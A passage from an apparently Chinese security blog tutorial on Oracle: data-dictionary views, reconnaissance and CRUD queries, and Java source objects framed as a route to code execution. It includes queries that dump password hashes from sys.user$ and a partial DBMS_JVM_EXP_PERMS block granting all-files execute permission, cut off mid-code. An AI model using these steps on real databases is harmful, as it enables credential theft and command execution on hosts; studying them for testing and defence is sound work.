alt="image.png"><br>设置完后就算安装结束了，只不过我这边本地不能用navicat去连接数据库。不知道为什么。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1702402493844-2bc0af05-4b37-4bbe-840d-1873436b6f4e.png#averageHue=%23fdfdfc&clientId=u318fcfe2-010e-4&from=paste&height=941&id=u06155d92&originHeight=941&originWidth=1435&originalType=binary&ratio=1&rotation=0&showTitle=false&size=60402&status=done&style=none&taskId=u1197b1c2-f6df-412d-9ca4-ae375044643&title=&width=1435" alt="image.png"><br>安装完后会有一个product文件夹，我们随便进去一个，然后进入BIN文件夹，就会看见sqlplus.exe，我们用它连接数据库就好了。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1702402520445-cf623205-92c5-4d7c-86ad-0c8d48986a05.png#averageHue=%23494d57&clientId=u318fcfe2-010e-4&from=paste&height=598&id=u136bac2a&originHeight=598&originWidth=1235&originalType=binary&ratio=1&rotation=0&showTitle=false&size=914697&status=done&style=none&taskId=u8b9e4134-ae70-4165-a6a8-ac577531f52&title=&width=1235" alt="image.png"><br>（图示为简单的命令执行）</p><h1 id="Oracle-表结构-amp-amp-基础语法查询"><a href="#Oracle-表结构-amp-amp-基础语法查询" class="headerlink" title="Oracle 表结构&amp;&amp;基础语法查询"></a>Oracle 表结构&amp;&amp;基础语法查询</h1><h3 id="user-tables"><a href="#user-tables" class="headerlink" title="user_tables"></a>user_tables</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line">SQL&gt; desc user_tables;</span><br><span class="line"> Name                                      Null?    Type</span><br><span class="line"> ----------------------------------------- -------- ----------------------------</span><br><span class="line"> TABLE_NAME                                NOT NULL VARCHAR2(128)</span><br><span class="line"> TABLESPACE_NAME                                    VARCHAR2(30)</span><br><span class="line"> CLUSTER_NAME                                       VARCHAR2(128)</span><br><span class="line"> IOT_NAME                                           VARCHAR2(128)</span><br><span class="line"> STATUS                                             VARCHAR2(8)</span><br><span class="line"> PCT_FREE                                           NUMBER</span><br><span class="line"> PCT_USED                                           NUMBER</span><br><span class="line"> INI_TRANS                                          NUMBER</span><br><span class="line"> MAX_TRANS                                          NUMBER</span><br><span class="line"> INITIAL_EXTENT                                     NUMBER</span><br><span class="line"> NEXT_EXTENT                                        NUMBER</span><br><span class="line"> MIN_EXTENTS                                        NUMBER</span><br><span class="line"> MAX_EXTENTS                                        NUMBER</span><br><span class="line"> PCT_INCREASE                                       NUMBER</span><br><span class="line"> FREELISTS                                          NUMBER</span><br><span class="line"> FREELIST_GROUPS                                    NUMBER</span><br><span class="line"> LOGGING                                            VARCHAR2(3)</span><br><span class="line"> BACKED_UP                                          VARCHAR2(1)</span><br><span class="line"> NUM_ROWS                                           NUMBER</span><br><span class="line"> BLOCKS                                             NUMBER</span><br><span class="line"> EMPTY_BLOCKS                                       NUMBER</span><br><span class="line"> AVG_SPACE                                          NUMBER</span><br><span class="line"> CHAIN_CNT                                          NUMBER</span><br><span class="line"> AVG_ROW_LEN                                        NUMBER</span><br><span class="line"> AVG_SPACE_FREELIST_BLOCKS                          NUMBER</span><br><span class="line"> NUM_FREELIST_BLOCKS                                NUMBER</span><br><span class="line"> DEGREE                                             VARCHAR2(10)</span><br><span class="line"> INSTANCES                                          VARCHAR2(10)</span><br><span class="line"> CACHE                                              VARCHAR2(5)</span><br><span class="line"> TABLE_LOCK                                         VARCHAR2(8)</span><br><span class="line"> SAMPLE_SIZE                                        NUMBER</span><br><span class="line"> LAST_ANALYZED                                      DATE</span><br><span class="line"> PARTITIONED                                        VARCHAR2(3)</span><br><span class="line"> IOT_TYPE                                           VARCHAR2(12)</span><br><span class="line"> TEMPORARY                                          VARCHAR2(1)</span><br><span class="line"> SECONDARY                                          VARCHAR2(1)</span><br><span class="line"> NESTED                                             VARCHAR2(3)</span><br><span class="line"> BUFFER_POOL                                        VARCHAR2(7)</span><br><span class="line"> FLASH_CACHE                                        VARCHAR2(7)</span><br><span class="line"> CELL_FLASH_CACHE                                   VARCHAR2(7)</span><br><span class="line"> ROW_MOVEMENT                                       VARCHAR2(8)</span><br><span class="line"> GLOBAL_STATS                                       VARCHAR2(3)</span><br><span class="line"> USER_STATS                                         VARCHAR2(3)</span><br><span class="line"> DURATION                                           VARCHAR2(15)</span><br><span class="line"> SKIP_CORRUPT                                       VARCHAR2(8)</span><br><span class="line"> MONITORING                                         VARCHAR2(3)</span><br><span class="line"> CLUSTER_OWNER                                      VARCHAR2(128)</span><br><span class="line"> DEPENDENCIES                                       VARCHAR2(8)</span><br><span class="line"> COMPRESSION                                        VARCHAR2(8)</span><br><span class="line"> COMPRESS_FOR                                       VARCHAR2(30)</span><br><span class="line"> DROPPED                                            VARCHAR2(3)</span><br><span class="line"> READ_ONLY                                          VARCHAR2(3)</span><br><span class="line"> SEGMENT_CREATED                                    VARCHAR2(3)</span><br><span class="line"> RESULT_CACHE                                       VARCHAR2(7)</span><br><span class="line"> CLUSTERING                                         VARCHAR2(3)</span><br><span class="line"> ACTIVITY_TRACKING                                  VARCHAR2(23)</span><br><span class="line"> DML_TIMESTAMP                                      VARCHAR2(25)</span><br><span class="line"> HAS_IDENTITY                                       VARCHAR2(3)</span><br><span class="line"> CONTAINER_DATA                                     VARCHAR2(3)</span><br><span class="line"> INMEMORY                                           VARCHAR2(8)</span><br><span class="line"> INMEMORY_PRIORITY                                  VARCHAR2(8)</span><br><span class="line"> INMEMORY_DISTRIBUTE                                VARCHAR2(15)</span><br><span class="line"> INMEMORY_COMPRESSION                               VARCHAR2(17)</span><br><span class="line"> INMEMORY_DUPLICATE                                 VARCHAR2(13)</span><br><span class="line"> DEFAULT_COLLATION                                  VARCHAR2(100)</span><br><span class="line"> DUPLICATED                                         VARCHAR2(1)</span><br><span class="line"> SYNCHRONOUS_DUPLICATED                             VARCHAR2(1)</span><br><span class="line"> SHARDED                                            VARCHAR2(1)</span><br><span class="line"> EXTERNALLY_SHARDED                                 VARCHAR2(1)</span><br><span class="line"> EXTERNALLY_DUPLICATED                              VARCHAR2(1)</span><br><span class="line"> EXTERNAL                                           VARCHAR2(3)</span><br><span class="line"> HYBRID                                             VARCHAR2(3)</span><br><span class="line"> CELLMEMORY                                         VARCHAR2(24)</span><br><span class="line"> CONTAINERS_DEFAULT                                 VARCHAR2(3)</span><br><span class="line"> CONTAINER_MAP                                      VARCHAR2(3)</span><br><span class="line"> EXTENDED_DATA_LINK                                 VARCHAR2(3)</span><br><span class="line"> EXTENDED_DATA_LINK_MAP                             VARCHAR2(3)</span><br><span class="line"> INMEMORY_SERVICE                                   VARCHAR2(12)</span><br><span class="line"> INMEMORY_SERVICE_NAME                              VARCHAR2(1000)</span><br><span class="line"> CONTAINER_MAP_OBJECT                               VARCHAR2(3)</span><br><span class="line"> MEMOPTIMIZE_READ                                   VARCHAR2(8)</span><br><span class="line"> MEMOPTIMIZE_WRITE                                  VARCHAR2(8)</span><br><span class="line"> HAS_SENSITIVE_COLUMN                               VARCHAR2(3)</span><br><span class="line"> ADMIT_NULL                                         VARCHAR2(3)</span><br><span class="line"> DATA_LINK_DML_ENABLED                              VARCHAR2(3)</span><br><span class="line"> LOGICAL_REPLICATION                                VARCHAR2(8)</span><br><span class="line"> STAGING                                            VARCHAR2(3)</span><br><span class="line"> ROW_CHANGE_TRACKING                                VARCHAR2(3)</span><br><span class="line"> HAS_RESERVABLE_COLUMN                              VARCHAR2(3)</span><br></pre></td></tr></table></figure><p>该表比较重要，是当前用户表，里面储存着该用户的所有信息。</p><h3 id="dba-tables"><a href="#dba-tables" class="headerlink" title="dba_tables"></a>dba_tables</h3><p>dba权限用户才可以查看的表，里面有系统里所有信息。表的结构和上述的user_tables一致</p><h3 id="all-tables"><a href="#all-tables" class="headerlink" title="all_tables"></a>all_tables</h3><p>当前用户可以查看的所有表，表结构也一样</p><h3 id="other"><a href="#other" class="headerlink" title="other"></a>other</h3><ul><li>DBA_ALL_TABLES：DBA 用户所拥有的或有访问权限的对象和表</li><li>ALL_ALL_TABLES：某一用户拥有的或有访问权限的对象和表</li><li>USER_ALL_TABLES：某一用户所拥有的对象和表</li></ul><p>表的结构都一样</p><h3 id="获取常见信息"><a href="#获取常见信息" class="headerlink" title="获取常见信息"></a>获取常见信息</h3><ul><li>版本 ：<code>SELECT banner FROM v$version WHERE banner LIKE &#39;Oracle%&#39;;</code>或者<code>SELECT version FROM v$instance;</code></li></ul><p><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1702460499639-44a01333-6931-4375-a70b-e7c5ef308af0.png#averageHue=%233f444d&clientId=u41a8b913-b9c9-4&from=paste&height=119&id=u62ac4232&originHeight=149&originWidth=687&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=148077&status=done&style=none&taskId=u818b3269-8c04-4a7b-8a91-3e5c3eabb72&title=&width=549.6" alt="image.png">、</p><ul><li>操作系统版本：<code>select banner from v$version where banner like &#39;TNS%&#39;</code></li></ul><p><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1702460547090-1a5cfb11-f313-4b62-a808-6d0841f5d77f.png#averageHue=%233a3f46&clientId=u41a8b913-b9c9-4&from=paste&height=109&id=u161df202&originHeight=136&originWidth=643&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=115572&status=done&style=none&taskId=ub1e99c7b-7186-4bfc-9c8c-3460c4d9f47&title=&width=514.4" alt="image.png"></p><ul><li>当前数据库：<code>select global_name from global_name;</code>，<code>select name from v$database;</code>,<code>select instance_name from v$instance</code>,<code>select sys.database_name from dual;</code></li></ul><p><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1702460627450-f94656c2-4628-43f7-ac04-be7f88f3b23c.png#averageHue=%23434752&clientId=u41a8b913-b9c9-4&from=paste&height=423&id=u5ccbcb86&originHeight=529&originWidth=918&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=654147&status=done&style=none&taskId=ueaeb9c26-cffc-4df1-b8df-8741d217c82&title=&width=734.4" alt="image.png"></p><ul><li>获取当前用户权限的所有数据库：<code>select distinct owner,table_name from all_tables;</code></li><li>获取所有表名：<code>select table_name from all_tables;</code></li><li>获取所有字段名：<code>select column_name from all_tab_columns where table_name=&#39;xxx&#39;;</code></li><li>获取当前用户：<code>select user from dual;</code></li></ul><p><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1702460744112-3d5a73fe-5884-4897-ab8d-40484da2d12b.png#averageHue=%23393e49&clientId=u41a8b913-b9c9-4&from=paste&height=114&id=u94ba13ec&originHeight=143&originWidth=427&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=83992&status=done&style=none&taskId=ucb297b8c-f2b3-4b44-9062-a654d21405f&title=&width=341.6" alt="image.png"></p><ul><li>获取所有数据库用户：<code>select username from all_users order by username;</code>、<code>select name from sys.user$;</code></li><li>获取数据库用户的密码hash：<code>SELECT name, password, astatus FROM sys.user$;</code>、<code>SELECT name, spare4 FROM sys.user$;</code></li><li>当前用户的所有权限：<code>select * from session_privs;</code></li></ul><p><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1702460840234-64a0034e-88fa-432a-9c5d-59339bda3278.png#averageHue=%23464b54&clientId=u41a8b913-b9c9-4&from=paste&height=106&id=u07dcedb0&originHeight=133&originWidth=909&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=170870&status=done&style=none&taskId=u4a11a880-9957-411a-87e0-e6745c3605b&title=&width=727.2" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1702460853884-20710945-7c63-4426-a56f-0a6754db295d.png#averageHue=%23464a55&clientId=u41a8b913-b9c9-4&from=paste&height=362&id=uf401c9e5&originHeight=452&originWidth=456&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=306515&status=done&style=none&taskId=u6d3695ad-2fe6-4d6d-b5e1-8ab95e69e4d&title=&width=364.8" alt="image.png"></p><ul><li>获取用户角色(DBA OR DBO)：<code>select grantee,granted_role from dba_role_privs;</code>或者<code>select distinct grantee from dba_sys_privs;</code></li></ul><p><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1702460923698-b1253a91-56eb-4800-8364-7f167a6564e1.png#averageHue=%23494d57&clientId=u41a8b913-b9c9-4&from=paste&height=466&id=u4f85830b&originHeight=583&originWidth=1185&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=869177&status=done&style=none&taskId=ua1582b1d-416f-42de-8252-74d2846d6f8&title=&width=948" alt="image.png"></p><h3 id="特性"><a href="#特性" class="headerlink" title="特性"></a>特性</h3><p>在oracle中字符串的连接符用<code>||</code>，并且单引号和双引号表示的意思也不一样<br><code>&#39;xxx&#39;</code>表示的是xxx这个字符串，而<code>&quot;xxx&quot;</code>就等价于一个变量xxx，这是不同的点，需要注意，另外oracle需要严格的select from 语法，我们需要<code>select xxx from dual</code></p><h1 id="CURD"><a href="#CURD" class="headerlink" title="CURD"></a>CURD</h1><p>oracle的增删改查和mysql其实差不多。</p><h3 id="建表"><a href="#建表" class="headerlink" title="建表"></a>建表</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">CREATE TABLE test1 (</span><br><span class="line">    tid NUMBER,</span><br><span class="line">    tname VARCHAR2 ( 20 )</span><br><span class="line">);</span><br><span class="line"> </span><br><span class="line">-- 或直接copy别的表结构</span><br><span class="line"> </span><br><span class="line">CREATE TABLE emp20 AS SELECT</span><br><span class="line">*</span><br><span class="line">FROM</span><br><span class="line">    EMP</span><br><span class="line">WHERE</span><br><span class="line">    DEPTNO = 20;-- where条件有效，复制数据，无效，只复制表结构</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1702459994674-238d2ab2-7429-4ed5-9d1f-ca2a2c057d7e.png#averageHue=%233c414b&clientId=u41a8b913-b9c9-4&from=paste&height=161&id=u510b12ed&originHeight=161&originWidth=457&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=105340&status=done&style=none&taskId=u97f5ccd2-260b-4fe2-9cf1-f6a4a35b411&title=&width=457" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1702460001844-b4b07ea8-843e-4615-9a98-ad7ad3c10aa8.png#averageHue=%23444953&clientId=u41a8b913-b9c9-4&from=paste&height=162&id=ube3fa97d&originHeight=162&originWidth=828&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=197398&status=done&style=none&taskId=u0cd6d15a-f952-4ae5-b17e-74dd0401096&title=&width=828" alt="image.png"></p><h3 id="增加新列"><a href="#增加新列" class="headerlink" title="增加新列"></a>增加新列</h3><p><code>ALTER TABLE test1 ADD photo VARCHAR2(20); </code><br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1702460060315-d308b482-40cf-458c-8e6f-b769ddfa1647.png#averageHue=%23464b54&clientId=u41a8b913-b9c9-4&from=paste&height=195&id=u29a60d3c&originHeight=195&originWidth=870&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=247629&status=done&style=none&taskId=u581e22fe-775b-470f-913a-bd4940730b6&title=&width=870" alt="image.png"></p><h3 id="修改列"><a href="#修改列" class="headerlink" title="修改列"></a>修改列</h3><p>修改tname列的varchar长度为40<br><code>ALTER TABLE test1 MODIFY tname VARCHAR2 ( 40 );</code><br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1702460104652-c2783912-e3d2-4e40-81a3-9f7fa955d0c4.png#averageHue=%23494e58&clientId=u41a8b913-b9c9-4&from=paste&height=250&id=u8f2425b3&originHeight=250&originWidth=941&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=337909&status=done&style=none&taskId=u963aa253-f23c-422f-881d-e6920c394a6&title=&width=941" alt="image.png"></p><h3 id="删除列"><a href="#删除列" class="headerlink" title="删除列"></a>删除列</h3><p><code>ALTER TABLE test1 DROP COLUMN photo2;</code><br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1702460125599-b5ee6c65-c071-491c-9b6f-882f93948705.png#averageHue=%23474b56&clientId=u41a8b913-b9c9-4&from=paste&height=454&id=u23a20272&originHeight=454&originWidth=921&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=594410&status=done&style=none&taskId=u7e2cac1e-6055-4211-b840-1519f2a013f&title=&width=921" alt="image.png"></p><h3 id="重命名某列"><a href="#重命名某列" class="headerlink" title="重命名某列"></a>重命名某列</h3><p><code>ALTER TABLE test1 RENAME COLUMN tname TO username;</code><br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1702460150404-34af94b0-b117-46db-8dff-316ae99a714f.png#averageHue=%23474c56&clientId=u41a8b913-b9c9-4&from=paste&height=245&id=u307f947e&originHeight=245&originWidth=790&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=287947&status=done&style=none&taskId=u32e52784-ee0a-4b01-a1d5-3d1bb718012&title=&width=790" alt="image.png"></p><h3 id="重命名表"><a href="#重命名表" class="headerlink" title="重命名表"></a>重命名表</h3><p><code>RENAME test1 TO test2;</code><br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1702460174448-d2e66cca-22a9-43f1-8514-8bc40b0d76c0.png#averageHue=%233e434d&clientId=u41a8b913-b9c9-4&from=paste&height=102&id=u1cc3dd84&originHeight=102&originWidth=552&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=83796&status=done&style=none&taskId=u28aa0c69-f452-482a-b1a8-8e615d78cf5&title=&width=552" alt="image.png"></p><h3 id="删除表"><a href="#删除表" class="headerlink" title="删除表"></a>删除表</h3><p><code>DROP TABLE testLearn;</code></p><h3 id="插入数据"><a href="#插入数据" class="headerlink" title="插入数据"></a>插入数据</h3><p><code>insert into test(tid,username,photo) values(100,&#39;test&#39;,&#39;test&#39;);</code><br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1702460301603-7366a7d2-6059-4c26-bfb5-337dea64214a.png#averageHue=%23484d57&clientId=u41a8b913-b9c9-4&from=paste&height=355&id=u1bbb318b&originHeight=355&originWidth=953&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=476105&status=done&style=none&taskId=u1d9760ee-9867-467c-929b-9dfc6744156&title=&width=953" alt="image.png"></p><h3 id="更新数据"><a href="#更新数据" class="headerlink" title="更新数据"></a>更新数据</h3><p><code>update test set username=&#39;admin&#39; where tid=100;</code><br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1702460365799-2caf8835-0c59-42eb-94fb-83c903090d0b.png#averageHue=%23474b55&clientId=u41a8b913-b9c9-4&from=paste&height=215&id=u57e26dac&originHeight=215&originWidth=843&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=263606&status=done&style=none&taskId=u422367e6-5255-495f-b552-5d8ca5a8592&title=&width=843" alt="image.png"></p><h3 id="删除数据"><a href="#删除数据" class="headerlink" title="删除数据"></a>删除数据</h3><p><code>delete from xxx where xxx=xxx</code><br>其实增删改查操作和mysql数据库完全一致。没什么不一样的</p><h1 id="Java-Source"><a href="#Java-Source" class="headerlink" title="Java Source"></a>Java Source</h1><h3 id="创建Java-source"><a href="#创建Java-source" class="headerlink" title="创建Java source"></a>创建Java source</h3><p>oracle有一个特别的地方就是他可以创建java代码，并且编译运行，也就是说假如我们获取了一个oracle数据库的dba权限，那么我们就获取了任意Java代码执行的权限。这是比较危险的一个特性<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1702478124796-17f181e3-b042-44b1-a9b2-736582354816.png#averageHue=%23faf9f8&clientId=u41a8b913-b9c9-4&from=paste&height=926&id=ua4fcbc61&originHeight=926&originWidth=2180&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=123529&status=done&style=none&taskId=u14770e74-7517-440d-81af-3e6e0dd5d07&title=&width=2180" alt="image.png"><br>官方是给了一个例子的，它使用的语法是<br><code>CREATE JAVA SOURCE NAMED &quot;xxxx&quot; AS &lt;Java Code&gt;</code><br>使用这一段语法可以创建一段java源码保存为oracle的一个对象，现在我使用如上语法创建一个输出hello world的函数。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">CREATE JAVA SOURCE NAMED &quot;Hello&quot; AS</span><br><span class="line">   public class Hello &#123;</span><br><span class="line">      public static String say() &#123;</span><br><span class="line">         return &quot;Welcome World&quot;;   &#125; &#125;</span><br><span class="line">/</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1702478411561-fa447e11-ec83-49d6-946a-3ea8f4c1ec44.png#averageHue=%2340454f&clientId=u41a8b913-b9c9-4&from=paste&height=182&id=u8686f3f6&originHeight=182&originWidth=534&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=144042&status=done&style=none&taskId=ub61b61d7-5e38-4f90-9ce1-f8075c890de&title=&width=534" alt="image.png"></p><h3 id="查询-Java-Souce-Object-ID"><a href="#查询-Java-Souce-Object-ID" class="headerlink" title="查询 Java Souce Object ID"></a>查询 Java Souce Object ID</h3><p><code>select OBJECT_ID from all_objects where object_name =&#39;Hello&#39;;</code><br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1702478446788-7f786d85-c49b-440f-99b8-967092a79480.png#averageHue=%23454953&clientId=u41a8b913-b9c9-4&from=paste&height=170&id=u112823fc&originHeight=170&originWidth=817&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=202635&status=done&style=none&taskId=u1ececeb0-78ce-4a54-99ec-4c9fb7410ea&title=&width=817" alt="image.png"><br>这里有2个的原因是我创建了2个。所以会有这样的bug，不过影响不大。</p><h3 id="高效语法"><a href="#高效语法" class="headerlink" title="高效语法"></a>高效语法</h3><p>为了避免上述的问题，根据官方doc<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1702478505021-32ea6834-ecbb-456d-8d4b-40f8d875232b.png#averageHue=%23f8f8f7&clientId=u41a8b913-b9c9-4&from=paste&height=496&id=u1f73d6ff&originHeight=496&originWidth=1243&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=40491&status=done&style=none&taskId=u385e5d8a-d07f-41e0-a665-2ecd5cd7130&title=&width=1243" alt="image.png"><br>我们可以将语句改造为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">CREATE OR REPLACE AND COMPILE JAVA SOURCE NAMED &quot;Hello&quot; AS</span><br><span class="line">   public class Hello &#123;</span><br><span class="line">      public static String say() &#123;</span><br><span class="line">         return &quot;Welcome World&quot;;   &#125; &#125;</span><br><span class="line">/</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1702478619144-91d28a8c-2add-45fd-b49d-e28d23083afe.png#averageHue=%23e7e6e5&clientId=u41a8b913-b9c9-4&from=paste&height=602&id=u697fa7ca&originHeight=602&originWidth=928&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=63076&status=done&style=none&taskId=u38a09d2e-1041-471a-9fb5-097806933da&title=&width=928" alt="image.png"></p><h3 id="删除-Java-Source"><a href="#删除-Java-Source" class="headerlink" title="删除 Java Source"></a>删除 Java Source</h3><p><code>DROP JAVA SOURCE &quot;Hello&quot;</code><br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1702478691233-a6961063-ee0d-4b52-aa7f-b9f2795cb066.png#averageHue=%23454953&clientId=u41a8b913-b9c9-4&from=paste&height=200&id=u30b26c52&originHeight=200&originWidth=825&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=239277&status=done&style=none&taskId=uc4c80cba-1b43-423f-982e-628f63fad7c&title=&width=825" alt="image.png"></p><h3 id="Function"><a href="#Function" class="headerlink" title="Function"></a>Function</h3><p>有了Java source后我们就可以利用function去创建一个oracle函数，便于我们后续调用命令<br>创建Java Source</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">CREATE OR REPLACE AND COMPILE JAVA SOURCE NAMED &quot;Hello&quot; AS</span><br><span class="line">   public class Hello &#123;</span><br><span class="line">      public static String say(String nothing) &#123;</span><br><span class="line">         return &quot;Welcome World&quot;;   &#125; &#125;</span><br><span class="line">/</span><br></pre></td></tr></table></figure><p>创建Function<br><code>create or replace function say(nothing in varchar2) return varchar2 as language java name &#39;Hello.say(java.lang.String) return String&#39;</code><br>调用Function<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1702479266043-e7e78cb8-613a-4152-9eff-fb7b2a226f5a.png#averageHue=%234a4e59&clientId=u41a8b913-b9c9-4&from=paste&height=474&id=u8cd17a02&originHeight=474&originWidth=1182&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=769735&status=done&style=none&taskId=u21081da8-6623-4630-960e-745ca7dbeff&title=&width=1182" alt="image.png"></p><h3 id="赋权问题"><a href="#赋权问题" class="headerlink" title="赋权问题"></a>赋权问题</h3><p>这里其实会有权限问题，因为我之前设置过，当我们创建完Fucntion后调用，其实是不会执行的，因为需要给用户加权限</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">DECLARE</span></span><br><span class="line">POL DBMS_JVM_EXP_PERMS.TEMP_JAVA_POLICY;</span><br><span class="line"><span class="keyword">CURSOR</span> C1 <span class="keyword">IS</span> <span class="keyword">SELECT</span> <span class="string">&#x27;GRANT&#x27;</span>,<span class="keyword">USER</span>(),<span class="string">&#x27;SYS&#x27;</span>,<span class="string">&#x27;java.io.FilePermission&#x27;</span>,<span class="string">&#x27;&lt;&lt;ALL FILES&gt;&gt;&#x27;</span>,<span class="string">&#x27;execute&#x27;</span>,<span class="string">&#x27;ENABLED&#x27;</span> <span class="keyword">FROM</span> DUAL;</span><br><span class="line"><span class="keyword">BEGIN</span></span><br><span class="line"><span class="keyword">OPEN</span> C1;</span><br><span class="line"><span class="keyword">FETCH</span> C1 BULK <span class="keyword">COLLECT</span> <span class="keyword">INTO</span> POL;</span><br><span class="line"><span class="keyword">CLOSE</span> C1;</span><br><span class="line">DBMS_JVM_EXP_PERMS.IMPORT_JVM_PERMS(POL);</span><br><span class="line"><span class="keyword">END</span>;</span><br><span class="line"><span class="operator">/</span></span><br><span class="line"><span class="keyword">DECLARE</span></span><br><span class="line">POL DBMS_JVM_EXP_PERMS.TEMP_JAVA_POLICY;</span><br><span class="line"><span class="keyword">CURSOR</span> C1 <span class="keyword">IS</span> <span class="keyword">SELECT</span> <span class="string">&#x27;GRANT&#x27;</span>,<span class="keyword">USER</span>(),<span class="string">&#x27;SYS&#x27;</span>,<span 